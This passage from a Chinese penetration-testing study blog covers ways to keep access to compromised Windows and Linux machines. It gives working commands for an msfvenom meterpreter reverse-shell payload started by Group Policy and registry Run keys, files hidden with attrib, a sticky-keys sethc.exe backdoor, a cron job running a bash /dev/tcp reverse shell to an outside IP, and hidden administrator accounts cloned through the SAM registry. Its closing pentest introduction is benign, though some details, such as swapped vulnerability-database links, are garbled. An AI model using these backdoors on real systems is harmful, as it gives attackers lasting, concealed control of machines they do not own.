title="3、选择要添加的脚本或者PowerShell"></a>3、选择要添加的脚本或者PowerShell</h4><p><img src="assets/clip_image003.jpg" alt="img"></p><h3 id="三、利用方式"><a href="#三、利用方式" class="headerlink" title="三、利用方式"></a>三、利用方式</h3><p>1、我么使用msf生成一段PowerShsell进行测， 试将生成的PowerShell脚本写入本地策略组中【还不会生成的请阅 读之前的内容】</p><h4 id="1-机器名和IP地址如下："><a href="#1-机器名和IP地址如下：" class="headerlink" title="( 1) 机器名和IP地址如下："></a>( 1) 机器名和IP地址如下：</h4><table><thead><tr><th>机器名称</th><th><strong>IP</strong>地址</th></tr></thead><tbody><tr><td>Windows Server  2008</td><td>192.168.1.141</td></tr><tr><td>Kali</td><td>192.168.1.142</td></tr></tbody></table><h4 id="2-kali-生成powershell"><a href="#2-kali-生成powershell" class="headerlink" title="( 2) kali 生成powershell"></a>( 2) kali 生成powershell</h4><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/x64/meterpreter/reverse_http -e x86/shikata_ga_nai -i 15 -b '\x00 '  lhost=192.168.1.142 lport=3333 -f  psh -o shell.ps1  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-将生成的powershell下载到2008机器上"><a href="#3-将生成的powershell下载到2008机器上" class="headerlink" title="( 3) 将生成的powershell下载到2008机器上"></a>( 3) 将生成的powershell下载到2008机器上</h4><p>使用 <code>python -m SimpleHTTPServer 8000</code><img src="assets/clip_image006-16838977011752.gif" alt="img">命令传递</p><p><img src="assets/clip_image007-16838977011753.jpg" alt="img"></p><h4 id="4-创建一个1-bat脚本，-并且添加到组策略【脚本】-中"><a href="#4-创建一个1-bat脚本，-并且添加到组策略【脚本】-中" class="headerlink" title="(4) 创建一个1.bat脚本， 并且添加到组策略【脚本】 中"></a>(4) 创建一个1.bat脚本， 并且添加到组策略【脚本】 中</h4><p><img src="assets/clip_image009.gif" alt="img"></p><p>bat脚本内容如下：</p><pre class="line-numbers language-none"><code class="language-none">@echo offpowershell.exe -w hidden  -ExecutionPolicy Bypass -NoExit  -File  C:\Users\Administrator\Desktop\keep\shell.ps1  exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-w 隐藏窗口-ExecutionPolicy Bypass 绕过策略-NoExit 不推出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="attrib隐藏shell-ps1和1-bat文件"><a href="#attrib隐藏shell-ps1和1-bat文件" class="headerlink" title="attrib隐藏shell.ps1和1.bat文件"></a>attrib隐藏shell.ps1和1.bat文件</h5><pre class="line-numbers language-none"><code class="language-none">#attrib隐藏attrib +s +h 1.batattrib +s +h shell.ps1#attrib还原attrib -s -h 1.batattrib -s -h shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加到组策略开机启动中：</p><p><img src="assets/clip_image010.jpg" alt="img"></p><h4 id="5-kali运行msf进行监听"><a href="#5-kali运行msf进行监听" class="headerlink" title="( 5) kali运行msf进行监听"></a>( 5) kali运行msf进行监听</h4><pre class="line-numbers language-none"><code class="language-none">use exploit/multi/handler  set payload  windows/x64/meterpreter/reverse_http  set LHOST 192.168.1.142  set LPORT 3333  run <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-重启2008机器查看是否已经连接"><a href="#6-重启2008机器查看是否已经连接" class="headerlink" title="( 6) 重启2008机器查看是否已经连接"></a>( 6) 重启2008机器查看是否已经连接</h4><p><img src="assets/clip_image012-16838977011754.gif" alt="img"></p><h2 id="启动文件夹维持"><a href="#启动文件夹维持" class="headerlink" title="启动文件夹维持"></a>启动文件夹维持</h2><h3 id="一、启动文件夹介绍"><a href="#一、启动文件夹介绍" class="headerlink" title="一、启动文件夹介绍"></a>一、启动文件夹介绍</h3><p>启动文件夹可以使程序在开始时候自动启动。将需要开机自动启动的程序复制到开始菜单——所有程序——启动的 文件夹内， 可以将开机程序自动启动。</p><h3 id="二、启动文件夹位置"><a href="#二、启动文件夹位置" class="headerlink" title="二、启动文件夹位置"></a>二、启动文件夹位置</h3><pre class="line-numbers language-none"><code class="language-none">启动文件夹:  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup   #系统级，需要system权限  C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup #用户级 普通用户就可以组策略脚本启动文件夹：  C:\Windows\System32\GroupPolicy\Machine\Scripts\StartupC:\Windows\System32\GroupPolicy\Machine\Scripts\Shutdown  C:\Windows\System32\GroupPolicy\User\Scripts\Logon  C:\Windows\System32\GroupPolicy\User\Scripts\Logoff  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三、利用方式-1"><a href="#三、利用方式-1" class="headerlink" title="三、利用方式"></a>三、利用方式</h3><p>将需要启动的文件放入就好， 不会的去上面看</p><h2 id="注册表维持"><a href="#注册表维持" class="headerlink" title="注册表维持"></a>注册表维持</h2><h3 id="一、注册表介绍"><a href="#一、注册表介绍" class="headerlink" title="一、注册表介绍"></a>一、注册表介绍</h3><p>注册表 ( Registry， 繁体中文版Windows操作系统称之为登录档) 是Microsoft Windows中的一个重要的数据库 ， 用于存储系统和应用程序的设置信息。早在Windows 3.0推出OLE技术的时候， 注册表就已经出现。随后推出的   Windows NT是第一个从系统级别广泛使用注册表的操作系统。但是， 从Microsoft Windows 95操作系统开始， 注 册表才真正成为Windows用户经常接触的内容， 并在其后的操作系统中继续沿用。</p><h3 id="二、注册表位置"><a href="#二、注册表位置" class="headerlink" title="二、注册表位置"></a>二、注册表位置</h3><p>1、在运行框中输入“<code>regedit</code> ”， 点击确定或者直接按键盘上的回车键， 打开组策略</p><h3 id="三、利用方式-2"><a href="#三、利用方式-2" class="headerlink" title="三、利用方式"></a>三、利用方式</h3><h4 id="1、Windows注册表存在的自启动后门较多，"><a href="#1、Windows注册表存在的自启动后门较多，" class="headerlink" title="1、Windows注册表存在的自启动后门较多，"></a>1、Windows注册表存在的自启动后门较多，</h4><p>此类后门主要利用原理为将Payload文件植入具备自启动特性的注册 表中， 这样Payload就会在计算机启动过程被执行。此处以较为经典的两类自启动项进行说明演示</p><pre class="line-numbers language-none"><code class="language-none"># HKEY_LOCAL_MACHINE类  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnceHKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce# HKEY_CURRENT_USER类  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce  HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceExHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2、本次实验利用方式是，-使用reg-add-命令进行添加，-命令介绍如下"><a href="#2、本次实验利用方式是，-使用reg-add-命令进行添加，-命令介绍如下" class="headerlink" title="2、本次实验利用方式是， 使用reg add 命令进行添加， 命令介绍如下"></a>2、本次实验利用方式是， 使用<code>reg add</code> 命令进行添加， 命令介绍如下</h4><pre class="line-numbers language-none"><code class="language-none">REG ADD KeyName [/v ValueName | /ve] [/t Type] [/s Separator] [/d Data] [/f]        [/reg:32 | /reg:64]  KeyName  [\\Machine\]FullKey           Machine  远程机器名 - 忽略默认到当前机器。远程机器上                    只有 HKLM 和 HKU 可用。           FullKey  ROOTKEY\SubKey           ROOTKEY  [ HKLM | HKCU | HKCR | HKU | HKCC ]           SubKey   所选 ROOTKEY 下注册表项的完整名称。  /v       所选项之下要添加的值名称。  /ve      为注册表项添加空白值名称(默认)。  /t       RegKey 数据类型           [ REG_SZ    | REG_MULTI_SZ | REG_EXPAND_SZ |             REG_DWORD | REG_QWORD    | REG_BINARY    | REG_NONE ]           如果忽略，则采用 REG_SZ。  /s       指定一个在 REG_MULTI_SZ 数据字符串中用作分隔符的字符           如果忽略，则将 "\0" 用作分隔符。  /d       要分配给添加的注册表 ValueName 的数据。  /f       不用提示就强行覆盖现有注册表项。 /reg:32  指定应该使用 32 位注册表视图访问的注册表项。 /reg:64  指定应该使用 64 位注册表视图访问的注册表项。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3、根据上述的提示，-我们将【-1-bat】添加到注册中，-进行启动"><a href="#3、根据上述的提示，-我们将【-1-bat】添加到注册中，-进行启动" class="headerlink" title="3、根据上述的提示， 我们将【 1.bat】添加到注册中， 进行启动"></a>3、根据上述的提示， 我们将【 1.bat】添加到注册中， 进行启动</h4><p><img src="assets/clip_image018-16838977011765.gif" alt="img"></p><p>使用如下命令</p><pre class="line-numbers language-none"><code class="language-none">reg add  "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"  /v shell /t REG_SZ /d "C:\Users\Administrator\Desktop\keep\1.bat"  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image020.gif" alt="img"></p><h4 id="4、测试能不能到kali进行连接"><a href="#4、测试能不能到kali进行连接" class="headerlink" title="4、测试能不能到kali进行连接"></a>4、测试能不能到kali进行连接</h4><p><img src="assets/clip_image021-16838977011766.jpg" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/2.windows-quan-xian-wei-chi-shift-hou-men/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/2.windows-quan-xian-wei-chi-shift-hou-men/</url>
      
        <content type="html"><![CDATA[<h1 id="Shift快捷键的介绍"><a href="#Shift快捷键的介绍" class="headerlink" title="Shift快捷键的介绍                                    "></a><strong>Shift</strong>快捷键的介绍                                   <a href="af://n3"> </a></h1><p>Windows的粘滞键是 C:\windows\system32\sethc.exe 的程序，  它本是为不方便按组合键的人设计的， Windows系统按5下shift后， Windows就执行了system32下的sethc.exe， 也就是启用了粘滞键</p><p><img src="assets/clip_image004-168389726300018.gif" alt="img"></p><p>查看此程序的运行权限发现是当前用户</p><p><img src="assets/clip_image006.gif" alt="img"></p><p>但是当我们未登陆系统(停留在登陆界面)的时候 系统还不知道我们将以哪个用户登陆,所以在这个时候连续按5次 shift后的话系统将会以system用户(具有管理员级别的权限)来运行sethc.exe这个程序</p><p><img src="assets/clip_image007-168389726300019.jpg" alt="img"></p><h2 id="Shift后门原理"><a href="#Shift后门原理" class="headerlink" title="Shift后门原理                                       "></a><strong>Shift</strong>后门原理                                      <a href="af://n16"> </a></h2><p>我们可以把cmd.exe这个程序更名称sethc.exe替换掉在登陆界面的时候我们连续按下5吃shift键系统以system权限 就会运行我们的cmd.exe那么我们的cmd.exe就具有了管理员权限了</p><h2 id="Shift后门制作"><a href="#Shift后门制作" class="headerlink" title="Shift后门制作                                       "></a><strong>Shift</strong>后门制作                                      <a href="af://n19"> </a></h2><h3 id="1、在命令行行执行以下命令，-为复制cmd-exe为sethc-exe"><a href="#1、在命令行行执行以下命令，-为复制cmd-exe为sethc-exe" class="headerlink" title="1、在命令行行执行以下命令， 为复制cmd.exe为sethc.exe"></a>1、在命令行行执行以下命令， 为复制cmd.exe为sethc.exe</h3><pre class="line-numbers language-none"><code class="language-none">copy C:\WINDOWS\system32\cmd.exe C:\windows\system32\sethc.exe  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是会提示拒绝访问</p><p><img src="assets/clip_image008.jpg" alt="img"></p><h3 id="2、需要更改文件权限，-如下命令"><a href="#2、需要更改文件权限，-如下命令" class="headerlink" title="2、需要更改文件权限， 如下命令"></a>2、需要更改文件权限， 如下命令</h3><pre class="line-numbers language-none"><code class="language-none">takeown /f c:\windows\system32\*.*  /a /r /d y  #注释： 强制将当前目录下的所有文件及文件夹、子文件 夹下的所有者更改为管理员组 (administrators)cacls c:\windows\system32\*.* /T /E /G administrators:F  #注释：在当前目录下的文件、子文件夹的 NTFS权限上添加管理员组(administrators)完全控制权限(并不删除原有所有NTFS权限设置)  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/clip_image009.jpg" alt="img"></p><h3 id="3、执行后就可以进行【-1】步骤的操作的，-成功执行"><a href="#3、执行后就可以进行【-1】步骤的操作的，-成功执行" class="headerlink" title="3、执行后就可以进行【 1】步骤的操作的， 成功执行"></a>3、执行后就可以进行【 1】步骤的操作的， 成功执行</h3><p><img src="assets/clip_image011.gif" alt="img"></p><h3 id="4、在未登陆的情况下按下5次Shift"><a href="#4、在未登陆的情况下按下5次Shift" class="headerlink" title="4、在未登陆的情况下按下5次Shift"></a>4、在未登陆的情况下按下5次Shift</h3><p><img src="assets/clip_image012.jpg" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/10.linux-quan-xian-wei-chi-ji-hua-ren-wu/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/10.linux-quan-xian-wei-chi-ji-hua-ren-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="定时任务介绍"><a href="#定时任务介绍" class="headerlink" title="定时任务介绍                                       "></a>定时任务介绍                                      <a href="af://n4"> </a></h1><p>Linux crontab 是用来定期执行程序的命令。</p><p>当安装完成操作系统之后， 默认便会启动此任务调度命令。</p><p>crond 命令每分钟会定期检查是否有要执行的工作， 如果有要执行的工作便会自动执行该工作。</p><p>注意： 新创建的 cron 任务， 不会马上执行， 至少要过 2 分钟后才可以， 当然你可以重启 cron 来马上执行。 命令介绍如下</p><pre class="line-numbers language-none"><code class="language-none">用法 :【crontab [options] file】  |【crontab [options]】  |【crontab -n [hostname]】 选项:-u &lt;user&gt;定义用户-e编辑用户的计划任务-l列出用户的计划任务-r删除用户的计划任务-i删除前提示-n &lt;host&gt;set host in cluster to run users ' crontabs-cget host in cluster to run users ' crontabs-sselinux context-x &lt;mask&gt;启用调试<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>时间格式如下：</p><pre class="line-numbers language-none"><code class="language-none">f1 f2 f3 f4 f5 program 分 时  天 月 星期几 执行的程序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">其中 f1 是表示分钟，f2 表示小时， f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。 program 表示要执行的程序。当  f1 为  * 时表示每分钟都要执行  program，  f2 为  * 时表示每小时都要执行程序，  其馀类推当  f1 为  a-b 时表示从第  a 分钟到第  b 分钟这段时间内要执行，  f2 为  a-b 时表示从第  a 到第  b 小时都要执 行，  其馀类推当  f1 为  */n 时表示每  n 分钟个时间间隔执行一次，  f2 为  */n 表示每  n 小时个时间间隔执行一次，  其馀类推     当  f1 为  a, b, c,... 时表示第  a, b, c,... 分钟要执行，  f2 为  a, b, c,... 时表示第  a, b, c...个小 时要执行，  其馀类推<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="定时任务维持"><a href="#定时任务维持" class="headerlink" title="定时任务维持                                       "></a>定时任务维持                                      <a href="af://n20"> </a></h1><h2 id="1、创建shell脚本在-x2F-tmp-x2F-shell-sh"><a href="#1、创建shell脚本在-x2F-tmp-x2F-shell-sh" class="headerlink" title="1、创建shell脚本在 /tmp/shell.sh"></a>1、创建shell脚本在 /tmp/shell.sh<img src="assets/clip_image002-16839593447041.gif" alt="img"></h2><pre class="line-numbers language-none"><code class="language-none">echo "bash -i &gt;&amp;/dev/tcp/47.120.13.249/12345 0&gt;&amp;1" &gt; /tmp/shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image005-16839593447053.jpg" alt="img"></p><h2 id="2、更改权限"><a href="#2、更改权限" class="headerlink" title="2、更改权限"></a>2、更改权限</h2><pre class="line-numbers language-none"><code class="language-none">chmod 755 /tmp/shell.sh  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、编辑计划任务"><a href="#3、编辑计划任务" class="headerlink" title="3、编辑计划任务"></a>3、编辑计划任务</h2><p> <code>crontab -e</code> <img src="assets/clip_image007.gif" alt="img">输入 <code>*/1 * * * * /tmp/shell.sh</code><img src="assets/clip_image009-16839593447054.gif" alt="img">， 如果是-e编辑的不需要添加用户名</p><pre class="line-numbers language-none"><code class="language-none">crontab -e*/1 * * * * /temp/shell.shcrontab -lsystemctl status crond //查看计划任务状态  systemctl start crond.service//启动计划任务  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/clip_image010-16839593447055.jpg" alt="img"></p><h2 id="4、在192-168-41-129上用nc监听，"><a href="#4、在192-168-41-129上用nc监听，" class="headerlink" title="4、在192.168.41.129上用nc监听，"></a>4、在192.168.41.129上用nc监听，</h2><pre class="line-numbers language-none"><code class="language-none">nc -lvvp 12345如果不行记得关闭防火墙systemctl stop firewalld.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/clip_image012-16839593447056.gif" alt="img"></p><h2 id="5、等待连接，-连接成功"><a href="#5、等待连接，-连接成功" class="headerlink" title="5、等待连接， 连接成功"></a>5、等待连接， 连接成功</h2><p><img src="assets/clip_image013-16839593447057.jpg" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/1.windows-quan-xian-wei-chi-ke-long-zhang-hao/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/1.windows-quan-xian-wei-chi-ke-long-zhang-hao/</url>
      
        <content type="html"><![CDATA[<h1 id="隐藏账户维持"><a href="#隐藏账户维持" class="headerlink" title="隐藏账户维持"></a>隐藏账户维持</h1><p>隐藏账户， 顾名思义就是计算机不看不到的用户(不是不存在用户只是用一般的查看方式看不到)</p><h2 id="符号隐藏用户"><a href="#符号隐藏用户" class="headerlink" title="$符号隐藏用户                                      "></a>$符号隐藏用户                                     <a href="af://n5"> </a></h2><p>$符号隐藏用户就是在一个用户名后面添加$符号， 如 (hack$) 达到简单的隐藏用户目的， 从而进行简单的权限维 持</p><h3 id="1、我们平时查看一个操作系统的有几个用户的命令如下"><a href="#1、我们平时查看一个操作系统的有几个用户的命令如下" class="headerlink" title="1、我们平时查看一个操作系统的有几个用户的命令如下"></a>1、我们平时查看一个操作系统的有几个用户的命令如下</h3><pre class="line-numbers language-none"><code class="language-none">net user //查看电脑中的用户命令 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image002.gif" alt="img"></p><p>可以看到当前一个2008的机器上存在两个用户Administrator和Guest</p><h3 id="2、接下来我们创建一个简单的隐藏用户，-如下命令"><a href="#2、接下来我们创建一个简单的隐藏用户，-如下命令" class="headerlink" title="2、接下来我们创建一个简单的隐藏用户， 如下命令"></a>2、接下来我们创建一个简单的隐藏用户， 如下命令</h3><pre class="line-numbers language-none"><code class="language-none">net user hack$ Admin@123 /add  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>net user 是添加用户命令， hack$为隐藏用户的用户名， Admin@123是密码</p><p><img src="assets/clip_image004.gif" alt="img"></p><h3 id="3、接下来使用net-user-命令查看电脑中的用户，-可以发现并没有hack-这个用户"><a href="#3、接下来使用net-user-命令查看电脑中的用户，-可以发现并没有hack-这个用户" class="headerlink" title="3、接下来使用net user 命令查看电脑中的用户， 可以发现并没有hack$这个用户"></a>3、接下来使用net user 命令查看电脑中的用户， 可以发现并没有hack$这个用户</h3><p><img src="assets/clip_image005.jpg" alt="img"></p><h3 id="4、但是通过【控制面板】-gt-【管理账户】-中是可以看到该用户的，-或者其他方式可是可以看到的-其他方式大家-自己搜索"><a href="#4、但是通过【控制面板】-gt-【管理账户】-中是可以看到该用户的，-或者其他方式可是可以看到的-其他方式大家-自己搜索" class="headerlink" title="4、但是通过【控制面板】->【管理账户】 中是可以看到该用户的， 或者其他方式可是可以看到的 (其他方式大家 自己搜索)"></a>4、但是通过【控制面板】-&gt;【管理账户】 中是可以看到该用户的， 或者其他方式可是可以看到的 (其他方式大家 自己搜索)</h3><p><img src="assets/clip_image006.jpg" alt="img"></p><h2 id="注册表克隆用户隐藏"><a href="#注册表克隆用户隐藏" class="headerlink" title="注册表克隆用户隐藏"></a>注册表克隆用户隐藏</h2><p>因为$用户可以看到， 在上一步的基础上我们打开注册表， 在注册表操作进行用户隐藏</p><p>提示： 该操作是建立在上面$符号隐藏用户的基础上的</p><h3 id="1、打开注册表"><a href="#1、打开注册表" class="headerlink" title="1、打开注册表"></a>1、打开注册表</h3><p>找到 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\</code> 路径下</p><p><img src="assets/clip_image007.jpg" alt="img"></p><h3 id="2、导出注册表文件-之前创建的hack-用户-，-会生成一个reg文件"><a href="#2、导出注册表文件-之前创建的hack-用户-，-会生成一个reg文件" class="headerlink" title="2、导出注册表文件 (之前创建的hack$用户) ， 会生成一个reg文件"></a>2、导出注册表文件 (之前创建的hack$用户) ， 会生成一个reg文件</h3><p><img src="assets/image-20230512211354571.png" alt="image-20230512211354571"></p><h3 id="3、-将administrator中的F键值复制"><a href="#3、-将administrator中的F键值复制" class="headerlink" title="3、  将administrator中的F键值复制"></a>3、  将<img src="assets/clip_image010.gif" alt="img">administrator<img src="assets/clip_image012.gif" alt="img">中的F键值复制</h3><p><img src="assets/clip_image013.jpg" alt="img"></p><h3 id="4、将复制的值，-粘贴到hack-对应的F值中"><a href="#4、将复制的值，-粘贴到hack-对应的F值中" class="headerlink" title="4、将复制的值， 粘贴到hack$对应的F值中"></a>4、将复制的值， 粘贴到hack$对应的F值中</h3><p><img src="assets/clip_image014.jpg" alt="img"></p><p><img src="assets/clip_image015.jpg" alt="img"></p><h3 id="5、将hack-对应的的数据导出来，-保存为hack-1"><a href="#5、将hack-对应的的数据导出来，-保存为hack-1" class="headerlink" title="5、将hack$ 对应的的数据导出来，  保存为hack$1"></a>5、将hack$ 对应的的数据导出来，  保存为hack$1</h3><p><img src="assets/clip_image016.jpg" alt="img"></p><h3 id="6、通过net命令删除hack-用户"><a href="#6、通过net命令删除hack-用户" class="headerlink" title="6、通过net命令删除hack$用户"></a>6、通过net命令删除hack$用户</h3><p>  命令： </p><pre class="line-numbers language-none"><code class="language-none">net  user hack$ /delete  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image018.gif" alt="img"></p><h3 id="7、此时hack-已经被删除，-但是我们有生成两个reg文件，-对两个文件进行运行"><a href="#7、此时hack-已经被删除，-但是我们有生成两个reg文件，-对两个文件进行运行" class="headerlink" title="7、此时hack$已经被删除， 但是我们有生成两个reg文件， 对两个文件进行运行"></a>7、此时hack$已经被删除， 但是我们有生成两个reg文件， 对两个文件进行运行</h3><p><img src="assets/clip_image019.jpg" alt="img"></p><h3 id="8、此时使用命令或者【账户管理】或者【计算机管理】都没有hack-用户"><a href="#8、此时使用命令或者【账户管理】或者【计算机管理】都没有hack-用户" class="headerlink" title="8、此时使用命令或者【账户管理】或者【计算机管理】都没有hack$用户"></a>8、此时使用命令或者【账户管理】或者【计算机管理】都没有hack$用户</h3><p><img src="assets/clip_image020.jpg" alt="img"></p><h3 id="9、但是使用注册表和wmic还是可以查看到此用户的"><a href="#9、但是使用注册表和wmic还是可以查看到此用户的" class="headerlink" title="9、但是使用注册表和wmic还是可以查看到此用户的"></a>9、但是使用注册表和wmic还是可以查看到此用户的</h3><p><img src="assets/clip_image021.jpg" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/34kali-gao-ji-shen-tou/01-kali-an-zhuang-pei-zhi/01-kali-an-zhuang-pei-zhi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/34kali-gao-ji-shen-tou/01-kali-an-zhuang-pei-zhi/01-kali-an-zhuang-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="1-1-渗透测试"><a href="#1-1-渗透测试" class="headerlink" title="1.1 渗透测试"></a>1.1 渗透测试</h1><h2 id="1、什么是渗透测试"><a href="#1、什么是渗透测试" class="headerlink" title="1、什么是渗透测试"></a>1、什么是渗透测试</h2><p><img src="assets/clip_image008.gif" alt="img"><img src="assets/clip_image009.jpg" alt="img"></p><h3 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h3><p><img src="assets/clip_image010.jpg" alt="img"></p><p><img src="assets/clip_image011.jpg" alt="img"><img src="assets/clip_image012.jpg" alt="img"></p><p><img src="assets/clip_image013.jpg" alt="img"></p><p><img src="assets/clip_image014.jpg" alt="img"></p><h3 id="软件测试"><a href="#软件测试" class="headerlink" title="软件测试"></a>软件测试</h3><p><img src="assets/clip_image015.jpg" alt="img"></p><h3 id="软件测试与渗透测试"><a href="#软件测试与渗透测试" class="headerlink" title="软件测试与渗透测试"></a>软件测试与渗透测试</h3><p>软件测试 (功能、性能、安全)</p><h3 id="安全三要素"><a href="#安全三要素" class="headerlink" title="安全三要素"></a>安全三要素</h3><p>保密性 ( Confidentiality)  [ˌkɒnfɪˌdenʃiˈæləti] </p><p>完整性 ( Integrity)       [ɪnˈteɡrəti]</p><p>可用性 (Availability)     [e, veile’bilati]</p><h3 id="渗透测试-Penetration-Testing"><a href="#渗透测试-Penetration-Testing" class="headerlink" title="渗透测试 ( Penetration Testing)"></a>渗透测试 ( Penetration Testing)</h3><p>渗透测试指的是在目标系统授权的情况下， 采取 可控的入侵手法， 模拟真实攻击者使用的各种方法和 技术， 绕过系统的防护措施 (权限控制、加密、完整 性、可靠性等) ， 以检验系统在真实环境中的安全性， 发现漏洞， 达到保护重要资产的目的。</p><p>l渗透测试的对象</p><p>l渗透测试的意义</p><p>l渗透测试的流程</p><p>l渗透测试与kali</p><h2 id="2、渗透测试的对象"><a href="#2、渗透测试的对象" class="headerlink" title="2、渗透测试的对象"></a>2、渗透测试的对象</h2><p><img src="assets/clip_image022.jpg" alt="img"></p><h3 id="渗透测试的对象"><a href="#渗透测试的对象" class="headerlink" title="渗透测试的对象"></a>渗透测试的对象</h3><p>1、 网络硬件设备</p><p>2、主机操作系统</p><p>3、应用系统</p><p>4、数据库系统</p><h2 id="3、渗透测试的意义"><a href="#3、渗透测试的意义" class="headerlink" title="3、渗透测试的意义"></a>3、渗透测试的意义</h2><h3 id="渗透测试的意义"><a href="#渗透测试的意义" class="headerlink" title="渗透测试的意义"></a>渗透测试的意义</h3><ul><li>发现漏洞</li><li>了解安全状态</li><li>重视风险</li><li>提升防护水平</li></ul><h2 id="4、渗透测试的流程"><a href="#4、渗透测试的流程" class="headerlink" title="4、渗透测试的流程"></a>4、渗透测试的流程</h2><h3 id="渗透测试的流程"><a href="#渗透测试的流程" class="headerlink" title="渗透测试的流程"></a>渗透测试的流程</h3><ul><li>确定目标</li><li>信息收集</li><li>漏洞扫描</li><li>漏洞利用</li><li>形成报告/清除痕迹</li></ul><h3 id="确定目标"><a href="#确定目标" class="headerlink" title="确定目标"></a>确定目标</h3><ul><li>范围</li><li>规则 (限制条件)</li><li>需求</li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>域名信息、 IP段、开放的端口、 网站架构、文件 目录结构、软件版本、WAF、旁站、 C段 … …</p><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>什么是漏洞？ vulnerability [ˌv ln r^ə ə bɪlətɪ]’ 和bug的区别</p><p>漏洞数据库</p><p>扫描工具</p><p>漏洞分类</p><h3 id="漏洞平台"><a href="#漏洞平台" class="headerlink" title="漏洞平台"></a>漏洞平台</h3><table><thead><tr><th>数据库</th><th>网址</th></tr></thead><tbody><tr><td>国 家 信 息 安 全 漏 洞 库   (  CNNVD)</td><td><a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></td></tr><tr><td>Structured Que 国家信息安全漏洞共享平台 (CNVD)</td><td><a href="http://www.cnnvd.org.cn/">http://www.cnnvd.org.cn/</a></td></tr><tr><td>国家工业信息安全漏洞库 (CICSVD)</td><td><a href="https://www.cics-vd.org.cn/">https://www.cics-vd.org.cn/</a></td></tr><tr><td>CVE</td><td><a href="http://cve.mitre.org/">http://cve.mitre.org/</a></td></tr></tbody></table><h3 id="漏洞扫描-1"><a 